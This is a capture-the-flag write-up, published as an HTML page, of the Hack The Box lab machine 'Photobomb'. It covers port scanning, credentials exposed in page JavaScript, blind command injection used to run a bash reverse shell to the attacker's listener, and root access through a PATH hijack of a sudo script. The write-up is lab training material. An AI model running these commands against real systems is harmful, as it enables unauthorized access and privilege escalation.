@@ -1,0 +1,333 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>D3p4k-Photobomb HTB</title>
+    <link rel="icon" type="image/png" href="https://labs.hackthebox.com/storage/avatars/52e97c6ca888644478ddcadfcd9f8be5.png">
+    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0-alpha3/dist/css/bootstrap.min.css" rel="stylesheet">
+    <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css" rel="stylesheet">
+    <link rel="stylesheet" href="../writeup.css">
+    </head>
+<body>
+    <!-- Socials -->
+    <div class="socials">
+        <a href="https://www.linkedin.com" target="_blank"><i class="fab fa-linkedin"></i></a>
+        <a href="https://app.hackthebox.com/profile/1979344" target="_blank">
+            <svg style="width: 24px; height: 24px;" role="img" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg">
+                <title>Hack The Box</title>
+                <path d="M11.9959.0008a1.1187 1.1187 0 00-.057.002.8993.8993 0 00-.2358.0498.9067.9067 0 00-.1652.079L1.9357 5.675a.889.889 0 00-.4444.7699c0 .006.0004.0128.0006.0192-.0002.007 0 .014 0 .0212V17.556a.889.889 0 00.469.7837l9.5983 5.5416c.018.0102.036.0197.054.0287v.002a.8568.8568 0 00.083.0348c0 .001.01.003.012.004.028.01.056.0177.085.0245.01.001.011.003.016.004.028.006.057.0112.086.0146 0 .0005.01.0009.014.001.03.003.061.005.091.005s.061-.002.091-.005c0-.0005.01-.0009.014-.001a.6831.6831 0 00.086-.0146c.01-.001.011-.002.016-.004a.9404.9404 0 00.085-.0245c0-.001.01-.003.012-.004a.8818.8818 0 00.083-.0347v-.002a1.086 1.086 0 00.054-.0287l9.5986-5.5416a.889.889 0 00.4689-.7837V6.4786c0-.009-.0006-.0172-.0008-.0258h.0003v-.008a.8886.8886 0 00-.3117-.6755c-.01-.008-.019-.0162-.029-.0241 0-.002-.01-.005-.01-.007a.8988.8988 0 00-.1074-.0705L12.4533.1267a.8872.8872 0 00-.4646-.1266zm.01 2.2523c.072 0 .1443.0187.209.056l6.5366 3.774c.2789.161.2789.5633 0 .7243l-6.5367 3.774a.4182.4182 0 01-.4182 0L5.26 6.8074c-.2788-.1609-.2789-.5633 0-.7243l6.5368-3.774a.4193.4193 0 01.209-.056zm-8.0801 6.458a.4145.4145 0 01.215.0565l6.524 3.7666a.417.417 0 01.2086.3612v7.5326c0 .3212-.3477.522-.626.3613l-6.5237-3.7666a.4172.4172 0 01-.2086-.3613V9.1288c0-.2408.1955-.414.4107-.4177zm16.1599 0c.215.004.4107.1768.4107.4177v7.5325c0 .149-.08.2868-.2087.3614l-6.5239 3.7666c-.278.1606-.6258-.0401-.6258-.3614v-7.5325c0-.149.08-.2867.2086-.3613l6.5238-3.7666a.415.415 0 01.2152-.0565z" fill="white"></path>
+            </svg>
+        </a>
+        <a href="https://github.com" target="_blank"><i class="fab fa-github"></i></a>
+    </div>
+
+    <!-- Navbar -->
+    <nav class="navbar navbar-expand-lg navbar-dark">
+        <div class="container">
+            <a class="navbar-brand" href="#">Photobomb - Hack the box</a>
+            <button class="navbar-toggler" type="button" data-bs-toggle="collapse" data-bs-target="#navbarNav">
+                <span class="navbar-toggler-icon"></span>
+            </button>
+            <div class="collapse navbar-collapse" id="navbarNav">
+                <ul class="navbar-nav ms-auto">
+                    <li class="nav-item"><a class="nav-link" href="../../index.html">Home</a></li>
+                    <li class="nav-item"><a class="nav-link" href="#Write-up">Write-up</a></li>
+                </ul>
+            </div>
+        </div>
+    </nav>
+
+    <!-- Sections -->
+    <div class="container">
+        <section id="machine-info" class="section">   
+            <h2>Machine Info:</h2>
+            <p>Photobomb is an easy Linux machine that uses plaintext credentials to access an internal web application. This application includes a `Download` functionality vulnerable to blind command injection. After gaining a foothold as the machine's main user, privilege escalation is achieved by exploiting a poorly configured shell script that references binaries without full paths. The script can be executed with `sudo`, providing root access.</p>
+            <img src="https://labs.hackthebox.com/storage/avatars/52e97c6ca888644478ddcadfcd9f8be5.png">
+        </section>
+
+        <section id="enumeration" class="section">
+    <h2>Enumeration:</h2>
+    <h3>Nmap:</h3>
+    
+    <div class="terminal-window">
+        <div class="window-header">
+            <span class="button close"></span>
+            <span class="button minimize"></span>
+            <span class="button maximize"></span>
+        </div>
+        <div class="terminal">
+            <pre><code class="language-Bash" style="white-space:pre-wrap;word-break:break-all">nmap -sV -sC 10.129.228.60 
+Starting Nmap 7.95 ( https://nmap.org ) at 2025-01-19 21:29 IST
+Nmap scan report for photobomb.htb (10.129.228.60)
+Host is up (0.047s latency).
+Not shown: 998 closed tcp ports (reset)
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   3072 e2:24:73:bb:fb:df:5c:b5:20:b6:68:76:74:8a:b5:8d (RSA)
+|   256 04:e3:ac:6e:18:4e:1b:7e:ff:ac:4f:e3:9d:d2:1b:ae (ECDSA)
+|_  256 20:e0:5d:8c:ba:71:f0:8c:3a:18:19:f2:40:11:d2:9e (ED25519)
+80/tcp open  http    nginx 1.18.0 (Ubuntu)
+|_http-server-header: nginx/1.18.0 (Ubuntu)
+|_http-title: Photobomb
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 14.64 seconds</code></pre>
+        </div>
+    </div>
+ <p>An initial Nmap scan reveals port 22 (SSH) and port 80 ( Nginx ) open.</p>   
+</section>
+
+<section id="Web Application" class="section">
+<h2>Web Application:</h2><p>We navigate to port 80 and get redirected to the photobomb.htb domain. After adding this domain to our <code>/etc/hosts</code> file, we refresh the page.</p>
+<div class="terminal-window">
+        <div class="window-header">
+            <span class="button close"></span>
+            <span class="button minimize"></span>
+            <span class="button maximize"></span>
+        </div>
+        <div class="terminal">
+<pre><code>echo &quot;10.129.228.60 photobomb.htb&quot; | sudo tee -a /etc/hosts
+[sudo] password for deepak: 
+10.129.228.60 photobomb.htb</code></pre>
+</div>
+    </div>
+<img src="./web1.png" alt="Upload Endpoint Screenshot" style="max-width: 100%; height: auto;">
+<br><br>
+<p>The page promotes an upcoming premium photographic gift franchise featuring a &quot;state-of-the-art&quot; web application. It includes a &quot;click here&quot; link that redirects to the <code>/printer</code> page. Clicking the link prompts us for login credentials, which the post mentions are included in a &quot;welcome pack”.</p>
+
+<img src="./web2.png" alt="Upload Endpoint Screenshot" style="max-width: 100%; height: auto;">
+<br><br>
+<p>When conducting web application testing, it can be highly beneficial to examine the page source of a website. Inspecting the source code allows us to better understand the structure of the webpage and identify any scripts running behind the scenes. Additionally, developers sometimes make mistakes, leaving misconfiguration or credentials visible within the page&#x27;s source code. By right-clicking the page and selecting &quot;View Source,&quot; we can access the underlying HTML to gather more details.</p>
+<div class="terminal-window">
+<div class="window-header">
+<span class="button close"></span>
+<span class="button minimize"></span>
+<span class="button maximize"></span>
+</div>
+<div class="terminal">
+<pre><code>&lt;!DOCTYPE html&gt;
+&lt;html&gt;
+&lt;head&gt;
+  &lt;title&gt;Photobomb&lt;/title&gt;
+  &lt;link type=&quot;text/css&quot; rel=&quot;stylesheet&quot; href=&quot;styles.css&quot; media=&quot;all&quot; /&gt;
+  &lt;script src=&quot;photobomb.js&quot;&gt;&lt;/script&gt;
+&lt;/head&gt;
+&lt;body&gt;
+  &lt;div id=&quot;container&quot;&gt;
+    &lt;header&gt;
+      &lt;h1&gt;&lt;a href=&quot;/&quot;&gt;Photobomb&lt;/a&gt;&lt;/h1&gt;
+    &lt;/header&gt;
+    &lt;article&gt;
+      &lt;h2&gt;Welcome to your new Photobomb franchise!&lt;/h2&gt;
+      &lt;p&gt;You will soon be making an amazing income selling premium photographic gifts.&lt;/p&gt;
+      &lt;p&gt;This state of-the-art web application is your gateway to this fantastic new life. Your wish is its command.&lt;/p&gt;
+      &lt;p&gt;To get started, please &lt;a href=&quot;/printer&quot; class=&quot;creds&quot;&gt;click here!&lt;/a&gt; (the credentials are in your welcome pack).&lt;/p&gt;
+      &lt;p&gt;If you have any problems with your printer, please call our Technical Support team on 4 4283 77468377.&lt;/p&gt;
+    &lt;/article&gt;
+  &lt;/div&gt;
+&lt;/body&gt;
+&lt;/html&gt;</code></pre>
+</div>
+</div>
+<p>We find a script that runs on the page, named photobomb.js . We click on the photobomb.js hyperlink and are given a view of the script itself</p>
+<div class="terminal-window">
+<div class="window-header">
+<span class="button close"></span>
+<span class="button minimize"></span>
+<span class="button maximize"></span>
+</div>
+<div class="terminal">
+<pre><code>function init() {
+  // Jameson: pre-populate creds for tech support as they keep forgetting them and emailing me
+  if (document.cookie.match(/^(.*;)?\s*isPhotoBombTechSupport\s*=\s*[^;]+(.*)?$/)) {
+    document.getElementsByClassName(&#x27;creds&#x27;)[0].setAttribute(&#x27;href&#x27;,&#x27;http://pH0t0:b0Mb!@photobomb.htb/printer&#x27;);
+  }
+}
+window.onload = init;</code></pre>
+</div>
+</div>
+<p>We navigate to the <code>/printer</code> page and successfully authenticate using the credentials <code>ph0t0:b0Mb!</code>.</p>
+<br><br>
+<img src="./web3.png" alt="Upload Endpoint Screenshot" style="max-width: 100%; height: auto;">
+</section>
+
+<section id="Command Injection" class="section">
+<h3><strong>Command Injection:</strong></h3><p>The <code>filetype</code> parameter is vulnerable to blind command injection, as demonstrated by successfully triggering a connection to our listener with <code>nc -lvnp 4444</code>.</p>
+<img src="./web4.png" alt="Upload Endpoint Screenshot" style="max-width: 100%; height: auto;">
+<br><br>
+<div class="terminal-window">
+<div class="window-header">
+<span class="button close"></span>
+<span class="button minimize"></span>
+<span class="button maximize"></span>
+</div>
+<div class="terminal">
+<pre id="18079dbf-6729-808c-b422-f87a5d4e87c3" class="code"><code class="language-Bash" style="white-space:pre-wrap;word-break:break-all">nc -lvnp 4444             
+listening on [any] 4444 ...
+connect to [10.10.14.57] from (UNKNOWN) [10.129.228.60] 43804
+GET / HTTP/1.1
+Host: 10.10.14.57:4444
+User-Agent: curl/7.68.0
+Accept: */*</code></pre>
+</div>
+</div>
+<p>The command <code>bash -c &#x27;exec bash -i &amp;&gt;/dev/tcp/10.10.14.57/443 &lt;&amp;1&#x27;</code> was used to achieve remote code executionby opening a reverse shell to the specified listener.</p>
+<img src="./web5.png" alt="Upload Endpoint Screenshot" style="max-width: 100%; height: auto;">
+<br><br>
+<div class="terminal-window">
+<div class="window-header">
+<span class="button close"></span>
+<span class="button minimize"></span>
+<span class="button maximize"></span>
+</div>
+<div class="terminal">
+<pre><code>nc -lnvp 7777                      
+listening on [any] 7777 ...
+connect to [10.10.14.51] from (UNKNOWN) [10.129.228.60] 59194
+bash: cannot set terminal process group (724): Inappropriate ioctl for device
+bash: no job control in this shell
+wizard@photobomb:~/photobomb$ python3 -c &#x27;import pty;pty.spawn(&quot;/bin/bash&quot;)&#x27;
+python3 -c &#x27;import pty;pty.spawn(&quot;/bin/bash&quot;)&#x27;
+wizard@photobomb:~/photobomb$ ^Z
+zsh: suspended  nc -lnvp 7777</code></pre>
+</div>
+</div>
+<p>We upgrade our shell to a <code>TTY</code> using the following Python one-liner.</p>
+<div class="terminal-window">
+<div class="window-header">
+<span class="button close"></span>
+<span class="button minimize"></span>
+<span class="button maximize"></span>
+</div>
+<div class="terminal">
+<pre><code>stty raw -echo ;fg    
+[1]  + continued  nc -lnvp 7777
+
+wizard@photobomb:~/photobomb$cd /home
+wizard@photobomb:/home$ cd wizard/
+wizard@photobomb:~$ ls
+photobomb  user.txt</code></pre>
+</div>
+</div>
+</section>
+
+<section id="Privilege Escalation" class="section">
+<h3<strong>Privilege Escalation:</strong></h3>
+<p>The user <code>wizard</code> has the following <code>sudo</code> privileges on the <code>photobomb</code> system:</p><ul class="bulleted-list"><li style="list-style-type:disc">They can execute <code>/opt/cleanup.sh</code> as <code>root</code> without a password (<code>NOPASSWD</code>) and with the ability to set environment variables (<code>SETENV</code>).</li></ul><p>This could potentially be exploited if the <code>cleanup.sh</code> script is writable or if it improperly handles environment variables or input.</p>
+<div class="terminal-window">
+<div class="window-header">
+<span class="button close"></span>
+<span class="button minimize"></span>
+<span class="button maximize"></span>
+</div>
+<div class="terminal">
+<pre><code>wizard@photobomb:~$ sudo -l
+Matching Defaults entries for wizard on photobomb:
+    env_reset, mail_badpass,
+    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
+
+User wizard may run the following commands on photobomb:
+    (root) SETENV: NOPASSWD: /opt/cleanup.sh</code></pre>
+</div>
+</div>   
+<p>The <code>cleanup.sh</code> script looks to be managing log files for the web application:</p>
+<div class="terminal-window">
+<div class="window-header">
+<span class="button close"></span>
+<span class="button minimize"></span>
+<span class="button maximize"></span>
+</div>
+<div class="terminal">
+<pre><code>wizard@photobomb:~$ cat /opt/cleanup.sh
+#!/bin/bash
+. /opt/.bashrc
+cd /home/wizard/photobomb
+
+# clean up log files
+if [ -s log/photobomb.log ] &amp;&amp; ! [ -L log/photobomb.log ]
+then
+  /bin/cat log/photobomb.log &gt; log/photobomb.log.old
+  /usr/bin/truncate -s0 log/photobomb.log
+fi
+
+# protect the priceless originals
+find source_images -type f -name &#x27;*.jpg&#x27; -exec chown root:root {} \;</code></pre>
+</div>
+</div> 
+<p>There’s a very simple path hijack in the script. I’ll notice that all the binaries called are referenced with full path except for that last <code>find</code>:</p> 
+<div class="terminal-window">
+<div class="window-header">
+<span class="button close"></span>
+<span class="button minimize"></span>
+<span class="button maximize"></span>
+</div>
+<div class="terminal">
+<pre><code>wizard@photobomb:~$ echo $PATH
+/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
+wizard@photobomb:~$ cd /tmp  
+wizard@photobomb:/tmp$ vim find
+
+#!/bin/bash
+bash
+~                                                                               
+~                                                                               
+~                                                                               
+~                                                                               
+~                                                                               
+~                                                                               
+~                                                                               
+~                                                                               
+~                                                                               
+~                                                                               
+~                                                                               
+~                                                                               
+~                                                                               
+~                                                                               
+~                                                                               
+~                                                                               
+~                                                                               
+~                                                                               
+~                                                                               
+~                                                                               
+~                                                                               
+&quot;find&quot; [New] 2L, 17C written
+
+wizard@photobomb:/tmp$ cat find 
+#!/bin/bash
+bash</code></pre>
+</div>
+</div> 
+<p>Running this <code>find</code> just starts a new <code>bash</code> instance as the current user.</p><p>Now I’ll run <code>cleanup.sh</code> as root but with the <code>PATH</code> variable including the current directory at the front of the path:</p>
+<div class="terminal-window">
+<div class="window-header">
+<span class="button close"></span>
+<span class="button minimize"></span>
+<span class="button maximize"></span>
+</div>
+<div class="terminal">
+<pre><code>wizard@photobomb:/tmp$ export PATH=/tmp:$PATH
+wizard@photobomb:/tmp$ chmod +x find
+wizard@photobomb:/tmp$ sudo PATH=/tmp:$PATH /opt/cleanup.sh</code></pre>
+</div>
+</div> 
+<p>It returns a root shell. And I can read <code>root.txt</code>:</p>
+
+<div class="terminal-window">
+<div class="window-header">
+<span class="button close"></span>
+<span class="button minimize"></span>
+<span class="button maximize"></span>
+</div>
+<div class="terminal">
+<pre><code>root@photobomb:/home/wizard/photobomb# id 
+uid=0(root) gid=0(root) groups=0(root)</code></pre>
+</div>
+</div> 
+</section>
+</div>
+<script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0-alpha3/dist/js/bootstrap.bundle.min.js"></script>
+</body>
+</html>
